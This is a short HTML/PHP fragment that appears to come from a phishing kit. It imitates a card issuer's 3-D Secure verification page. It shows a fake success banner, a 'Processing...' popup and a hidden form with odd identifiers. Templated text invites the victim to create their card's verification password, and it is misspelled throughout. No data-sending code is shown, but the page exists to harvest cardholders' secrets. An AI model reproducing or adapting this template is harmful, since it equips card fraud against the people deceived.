...
<body>
<div id="Rotation"><p style="font-size: 13px;">3-D Auth Has Been Processed Successfully...</p></div>
	...
	<div id="popup"><p>Processing... </p></div>
        <div id="xGhostRiderForm" style="display: none;">
            ...
            <div id="xDoctorStrange_L2"><?=$Type_XXX;?> helps protect your <b></b> card against unauthorized use online - at no additional cost. To use <?=$Type_XXX;?> on this and futur purshases. complete this page and You'll create your own <?=$Type_XXX;?> Password</div>
